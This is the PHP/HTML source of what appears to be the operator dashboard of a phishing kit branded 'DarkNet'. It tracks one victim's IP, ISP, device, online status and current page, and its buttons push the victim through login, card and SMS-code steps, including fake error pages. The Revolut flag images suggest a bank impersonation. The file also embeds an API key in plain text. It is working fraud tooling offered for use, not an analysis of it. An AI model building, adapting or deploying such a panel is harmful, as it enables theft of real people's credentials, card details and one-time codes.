<?php
    // =============================
    include "./Assets/php/config/config.php";
    $ip_infos = file_get_contents("https://pro.ip-api.com/php/". $_GET['ip'] ."?key=UO8wl6MQD2zPxmf&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
    $ip_infos = unserialize($ip_infos);
    // =============================
    $cu = file_get_contents("http://country.io/phone.json");
    $cu = json_decode($cu, true);
    // =============================
    $device_and_browser = file_get_contents("./data/user.json");
    $info_device_and_browser = json_decode($device_and_browser, true);
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/flowbite@3.1.2/dist/flowbite.min.css" rel="stylesheet" />
    <link rel="icon" type="image/x-icon" href="./Assets/imgs/logo2.jpg" />

    <title>root@control:~#</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap');

        * {
            font-family: 'JetBrains Mono', 'Courier New', monospace;
        }

        body {
            background: #000000;
            background-image:
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            overflow-x: hidden;
            color: #00ff41;
            min-height: 100vh;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 0, 0, 0.15),
                rgba(0, 0, 0, 0.15) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 999;
        }

        .wrapper {
            width: 100%;
        }

        button[type="submit"],
        button[type="button"],
        a.btn {
            font-size: 12px;
            font-weight: 700;
            display: inline-block;
            text-align: center;
            padding: 8px 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-radius: 3px;
            transition: all 0.2s ease;
            border-width: 1px;
            border-style: solid;
            text-decoration: none;
        }

        .btn-primary {
            background: rgba(0, 255, 65, 0.1);
            color: #00ff41;
            border-color: #00ff41;
        }

        .btn-primary:hover {
            background: #00ff41;
            color: #000000;
            box-shadow: 0 0 20px #00ff41, 0 0 40px rgba(0, 255, 65, 0.5);
        }

        .btn-success {
            background: rgba(0, 255, 65, 0.05);
            color: #00ff41;
            border-color: rgba(0, 255, 65, 0.5);
        }

        .btn-success:hover {
            background: #00ff41;
            color: #000000;
            box-shadow: 0 0 15px #00ff41;
        }

        .btn-danger {
            background: rgba(255, 0, 64, 0.05);
            color: #ff0040;
            border-color: rgba(255, 0, 64, 0.5);
        }

        .btn-danger:hover {
            background: #ff0040;
            color: #000000;
            box-shadow: 0 0 15px #ff0040;
        }

        .header {
            gap: 15px;
        }

        .wrapper img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            opacity: 0.02;
            z-index: -1;
            cursor: pointer;
        }

        .ipx {
            animation: bubble 1.0s infinite;
            color: #00ff41;
            font-size: 13px;
            text-shadow: 0 0 10px #00ff41;
            letter-spacing: 2px;
        }

        .box {
            width: 100%;
            border: 1px solid #00ff41;
            display: flex;
            padding: 15px;
            position: relative;
            background: rgba(0, 255, 65, 0.03);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2), inset 0 0 20px rgba(0, 255, 65, 0.05);
            border-radius: 4px;
        }

        .box_img {
            width: 70px;
            height: auto;
            position: absolute;
            right: 15px;
            opacity: 0.3;
            filter: hue-rotate(80deg) saturate(3);
        }

        .box h1 {
            font-size: 13px;
            color: #00ff41;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 5px;
            text-shadow: 0 0 8px rgba(0, 255, 65, 0.5);
        }

        .box p {
            font-size: 20px;
            font-weight: 700;
            color: #00ff41;
            margin: 0;
            text-shadow: 0 0 10px #00ff41;
        }

        .box p::before {
            content: '> ';
            color: #00ff41;
            opacity: 0.7;
        }

        @keyframes bubble {
            0%   { transform: scale(0.5); opacity: 0.0; }
            50%  { transform: scale(1.2); opacity: 0.5; }
            100% { transform: scale(1.0); opacity: 1.0; }
        }

        form {
            display: grid;
            margin-top: 20px;
            grid-template-columns: repeat(8, 1fr);
            gap: 10px;
        }

        .full_row {
            grid-column: 1 / 9;
        }

        .online {
            color: #00ff41;
            text-shadow: 0 0 10px #00ff41;
        }

        .offline {
            color: #ff0040;
            text-shadow: 0 0 10px #ff0040;
        }

        table {
            border: 1px solid rgba(0, 255, 65, 0.3) !important;
            border-collapse: collapse !important;
            background: rgba(0, 255, 65, 0.02);
        }

        thead {
            background: rgba(0, 255, 65, 0.08) !important;
        }

        thead tr th {
            color: #00ff41 !important;
            background: rgba(0, 255, 65, 0.08) !important;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 11px;
            border-bottom: 1px solid rgba(0, 255, 65, 0.3) !important;
        }

        tbody tr {
            border-bottom: 1px solid rgba(0, 255, 65, 0.15) !important;
        }

        tbody tr th,
        tbody tr td {
            color: #00ff41 !important;
            font-size: 12px;
            border: none !important;
        }

        tbody tr th {
            background: rgba(0, 255, 65, 0.03) !important;
        }

        .logo p {
            font-size: 12px;
            color: #00ff41 !important;
            letter-spacing: 3px;
            text-shadow: 0 0 10px #00ff41;
        }

        footer p {
            color: rgba(0, 255, 65, 0.6) !important;
            font-size: 12px;
            letter-spacing: 1px;
        }

        footer a {
            color: #00ff41 !important;
            text-decoration: none;
            text-shadow: 0 0 8px #00ff41;
        }

        footer a:hover {
            color: #ffffff !important;
            text-shadow: 0 0 15px #00ff41;
        }

        .blink {
            animation: blink 1s step-end infinite;
        }

        @keyframes blink {
            50% { opacity: 0; }
        }

        .container {
            position: relative;
            z-index: 2;
        }

        @media (max-width: 768px) {
            form {
                grid-template-columns: repeat(2, 1fr);
            }
            .full_row {
                grid-column: 1 / 3;
            }
            .box p {
                font-size: 16px;
            }
        }
    </style>
</head>

<body>
    <div class="header container d-flex align-items-center pt-3 justify-content-between">
        <div class="box">
            <div class="txt">
                <h1>Total Visitors</h1>
                <p><?php echo getVisitorsCount(); ?></p>
            </div>
            <img src="./Assets/imgs/vis_panel.png" class="box_img" alt="">
        </div>
        <div style="border: none;" class="logo box d-flex justify-content-center flex-column align-items-center text-center">
            <img src="./Assets/imgs/logo2.jpg" alt="" style="width: 50px; border-radius: 50%;">
            <p class="mb-0"><?php echo base64_decode("RGFya05ldA=="); ?></p>
        </div>
        <div class="box">
            <div class="txt">
                <h1>Current Page</h1>
                <p id="page" style="font-size: 15px;">---</p>
            </div>
            <img src="./Assets/imgs/browser.png" class="box_img" alt="">
        </div>
    </div>

    <div class="relative container overflow-x-auto mt-3">
        <table class="w-full text-sm text-left">
            <thead>
                <tr>
                    <th scope="col" class="px-3 py-3">
                        <i class="ri-map-pin-fill" style="font-size: 17px;"></i> IP Address
                    </th>
                    <th scope="col" class="px-3 py-3">
                        <i class="ri-global-fill" style="font-size: 17px;"></i> Country
                    </th>
                    <th scope="col" class="px-3 py-3">
                        <i class="ri-router-line" style="font-size: 17px;"></i> ISP
                    </th>
                    <th scope="col" class="px-3 py-3">
                        <i class="ri-cpu-line" style="font-size: 17px;"></i> Device
                    </th>
                    <th scope="col" class="px-3 py-3">
                        <i class="ri-base-station-fill" style="font-size: 17px;"></i> Status
                    </th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <th scope="row" class="px-3 py-4">
                        <?php echo htmlspecialchars($_GET["ip"]); ?>
                    </th>
                    <td class="px-3 py-4">
                        <img style="width: 23px;" class="d-inline" src="https://assets.revolut.com/assets/flags/<?php echo htmlspecialchars($ip_infos["countryCode"]); ?>@2x.webp" onerror="this.style.display='none'">
                        <p class="mb-0 d-inline"><?php echo htmlspecialchars($ip_infos["country"]); ?></p>
                    </td>
                    <td class="px-3 py-4">
                        <p class="mb-0"><?php echo htmlspecialchars($ip_infos["isp"]); ?></p>
                    </td>
                    <td class="px-3 py-4">
                        <?php echo htmlspecialchars($info_device_and_browser[$_GET['ip']]['device']); ?> /
                        <i class="ri-<?php echo strtolower(htmlspecialchars($info_device_and_browser[$_GET['ip']]['browser'])); ?>-fill"></i>
                    </td>
                    <td class="px-3 py-4">
                        <p class="mb-0" id="visitor-list"></p>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <div class="container">
        <form method="post" action="./Assets/php/config/control.php">
            <input type="hidden" name="step" value="control">
            <input type="hidden" name="ip" value="<?php echo htmlspecialchars($_GET['ip']); ?>">
            <button type="submit" class="btn btn-primary full_row" name="to" value="app">[ APP ]</button>
            <button type="submit" class="btn btn-success" name="to" value="log">LOGIN</button>
            <button type="submit" class="btn btn-danger" name="to" value="log_error">LOGIN ERR</button>
            <button type="submit" class="btn btn-success" name="to" value="card">CARD</button>
            <button type="submit" class="btn btn-danger" name="to" value="card_error">CARD ERR</button>
            <button type="submit" class="btn btn-success" name="to" value="sms">SMS</button>
            <button type="submit" class="btn btn-danger" name="to" value="sms_error">SMS ERR</button>
            <button type="submit" class="btn btn-success full_row" name="to" value="success">
                <i class="ri-checkbox-circle-fill" style="font-weight: normal;"></i> [ ✓ SUCCESS ]
            </button>
        </form>
        <div class="ip mt-3">
            <?php if (isset($_GET["ip"])): ?>
                <p class="text-center ipx">
                    <?php echo htmlspecialchars($_GET["ip"]); ?>
                    <span class="blink">_</span>
                </p>
            <?php endif; ?>
        </div>
    </div>

    <footer class="text-center container pt-3" style="border-top: 1px solid rgba(0, 255, 65, 0.3);">
        <p>
            root@control:~#
            <a href="https://t.me/DarkNet_v1"><?php echo base64_decode("QERhcmtOZXQ="); ?></a>
            // <?php echo base64_decode("QCAyMDI1"); ?>
            <?php echo base64_decode("QWxsIFJpZ2h0cyBSZXNlcnZhZA=="); ?>
        </p>
    </footer>

    <!-- JS FILES -->
    <script src="https://cdn.jsdelivr.net/npm/flowbite@3.1.2/dist/flowbite.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
    <script src="assets/js/script.js"></script>

    <script>
        function fetchVisitors() {
            const targetIp = '<?php echo htmlspecialchars($_GET["ip"]); ?>';

            fetch('./status/get_visitors.php')
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById('visitor-list');
                    const pageEl = document.getElementById('page');
                    container.innerHTML = '';

                    // this ip has no data
                    const info = data[targetIp];
                    if (!info) {
                        container.innerHTML = `<span class="offline">OFFLINE</span>`;
                        pageEl.textContent = 'unknown';
                        return;
                    }

                    const now = Math.floor(Date.now() / 1000);
                    const isOnline = (now - info.last_update) < 60 && info.status === 'online';

                    const span = document.createElement('span');
                    span.className = isOnline ? 'online' : 'offline';
                    span.innerHTML = isOnline ? 'ONLINE' : 'OFFLINE';
                    container.appendChild(span);

                    pageEl.textContent = info.current_page || 'unknown';
                })
                .catch(() => {
                    document.getElementById('visitor-list').innerHTML = '<span class="offline">ERR</span>';
                    document.getElementById('page').textContent = 'unknown';
                });
        }

        fetchVisitors();
        setInterval(fetchVisitors, 5000);
    </script>
</body>
</html>